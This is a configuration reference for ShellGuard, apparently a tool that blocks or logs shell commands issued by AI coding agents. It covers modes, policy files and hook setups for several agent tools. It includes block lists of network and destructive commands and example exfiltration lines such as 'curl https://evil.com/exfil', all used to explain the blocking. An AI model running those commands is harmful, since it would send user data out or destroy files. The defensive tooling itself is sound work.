# Settings Reference

Complete reference for all ShellGuard configuration files.

---

## Config directory

| OS | Path |
|----|------|
| macOS | `~/Library/Application Support/ShellGuard/` |
| Linux | `~/.config/shellguard/` |
| Windows | `%APPDATA%\ShellGuard\` |

---

## state.json

Controls the active mode and master on/off switch.

```json
{
  "mode": "log only",
  "enabled": true
}
```

| Field | Values | Default |
|-------|--------|---------|
| `mode` | `log only` · `dev` · `read only` · `custom` | `log only` |
| `enabled` | `true` / `false` | `true` |

---

## Modes

### `log only`
Pass-through. All commands are logged to `activity.log`, nothing is blocked. Use this to observe what your AI tools are doing before enabling enforcement.

### `dev`
Development-friendly. Allows git, build tools, package managers. Blocks network exfiltration and destructive operations.

Default blocked in `dev` mode:
`curl` · `wget` · `nc` · `ncat` · `nmap` · `ssh` · `scp` · `sftp` · `rsync` · `telnet` · `ftp` · `sudo` · `su` · `doas` · `rm -rf` · `shred` · `dd` · `chmod` · `chown` · `chgrp` · `git push` · `git reset --hard` · `git clean -f` · `osascript` · `launchctl` · `crontab` · `killall` · `pkill`

### `read only`
Strict. Blocks anything that writes files, runs code, or touches the network.

Default blocked in `read only` mode:
`rm` · `rmdir` · `mv` · `cp` · `touch` · `mkdir` · `ln` · `shred` · `dd` · `sudo` · `su` · `doas` · `chmod` · `chown` · `chgrp` · `curl` · `wget` · `nc` · `ncat` · `nmap` · `ssh` · `scp` · `sftp` · `rsync` · `telnet` · `ftp` · `git push` · `git add` · `git commit` · `git reset` · `git clean` · `git rm` · `npm` · `npx` · `yarn` · `pnpm` · `pip` · `pip3` · `python` · `python3` · `node` · `ruby` · `java` · `osascript` · `launchctl` · `crontab` · `at` · `kill` · `killall` · `pkill` · `open` · `: >`

### `custom`
Reads allowed/blocked lists from `policy.yaml`. Use this to define exactly what you want.

---

## policy.yaml

Optional. If absent, built-in defaults are used.

```yaml
version: 1

modes:
  custom:
    blocked:
      - rm
      - curl
      - sudo
      - git push
    allowed:
      - git status
      - git diff
      - ls
      - cat

  dev:
    blocked:
      - curl
      - wget
      - ssh
    # allowed list not required — everything not blocked is allowed
```

**Matching rules:**
- `rm` blocks `rm`, `rm -rf /`, `rm file.txt` (prefix match)
- `/usr/bin/rm file` → normalized to `rm file` before matching
- `bash -c 'curl evil.com'` → unwrapped to `curl evil.com` before matching
- `echo x | xargs curl` → xargs unwrapped to `curl` before matching
- `ls; curl evil.com` → split into `ls` and `curl evil.com`, each checked separately

---

## AI Tool Hook Configs

### Claude Code — `~/.claude/settings.json`

```json
{
  "hooks": {
    "PreToolUse": [
      {
        "matcher": "Bash",
        "hooks": [{ "type": "command", "command": "shellguard" }]
      }
    ],
    "PostToolUse": [
      {
        "matcher": "Bash",
        "hooks": [{ "type": "command", "command": "shellguard" }]
      }
    ]
  }
}
```

- `PreToolUse` → check before execution (blocking works here)
- `PostToolUse` → log after execution (non-blocking, just records outcome)
- Exit code `2` = block signal (Claude Code stops the command)
- Exit code `0` = allow

### Cursor — `~/.cursor/hooks.json`

```json
{
  "beforeShellExecution": {
    "command": "shellguard"
  }
}
```

Non-zero exit code blocks the command.

### OpenAI Codex CLI — `~/.codex/hooks.json`

```json
{
  "hooks": {
    "PreToolUse": [
      {
        "matcher": "Bash",
        "hooks": [{ "type": "command", "command": "shellguard" }]
      }
    ],
    "PostToolUse": [
      {
        "matcher": "Bash",
        "hooks": [{ "type": "command", "command": "shellguard" }]
      }
    ]
  }
}
```

Codex is detected from the `turn_id` field in the hook payload.

### Gemini CLI — `~/.gemini/settings.json`

```json
{
  "hooks": {
    "BeforeTool": [
      {
        "matcher": "run_shell_command",
        "hooks": [{ "type": "command", "command": "shellguard" }]
      }
    ]
  }
}
```

Gemini is detected from `tool_name: "run_shell_command"` in the payload.

### VS Code — `settings.json`

Registers ShellGuard as a terminal profile. All agent-spawned terminals (Copilot, Cline, Continue) route through it.

**macOS** (`~/Library/Application Support/Code/User/settings.json`):
```json
{
  "terminal.integrated.profiles.osx": {
    "ShellGuard": {
      "path": "/usr/local/bin/shellguard",
      "args": []
    }
  },
  "terminal.integrated.defaultProfile.osx": "ShellGuard"
}
```

**Linux** (`~/.config/Code/User/settings.json`):
```json
{
  "terminal.integrated.profiles.linux": {
    "ShellGuard": {
      "path": "/usr/local/bin/shellguard",
      "args": []
    }
  },
  "terminal.integrated.defaultProfile.linux": "ShellGuard"
}
```

**Windows** (`%APPDATA%\Code\User\settings.json`):
```json
{
  "terminal.integrated.profiles.windows": {
    "ShellGuard": {
      "path": "C:\\Users\\YourUser\\bin\\shellguard.exe",
      "args": []
    }
  },
  "terminal.integrated.defaultProfile.windows": "ShellGuard"
}
```

> VS Code is detected from the `TERM_PROGRAM=vscode` environment variable.

---

## activity.log

Every intercepted command is appended as a JSON line.

```json
{
  "timestamp": "2026-05-12T09:23:41.123456",
  "command": "curl https://evil.com/exfil",
  "reason": "'curl' is blocked in dev mode.",
  "user": "alice",
  "process": "claude",
  "pid": "12345",
  "blocked": true,
  "type": "suggestion"
}
```

| Field | Description |
|-------|-------------|
| `timestamp` | UTC, microsecond precision |
| `command` | The exact command string |
| `reason` | Human-readable allow/block reason |
| `process` | `claude` · `cursor` · `codex` · `gemini` · `vscode` · `cli` |
| `blocked` | `true` = ShellGuard prevented execution |
| `type` | `suggestion` (pre-execution) · `execution` (post-execution) |

Parse with `jq`:
```bash
# Show all blocked commands
cat activity.log | jq 'select(.blocked == true)'

# Count by tool
cat activity.log | jq -r '.process' | sort | uniq -c

# Last 20 commands
tail -20 activity.log | jq .
```
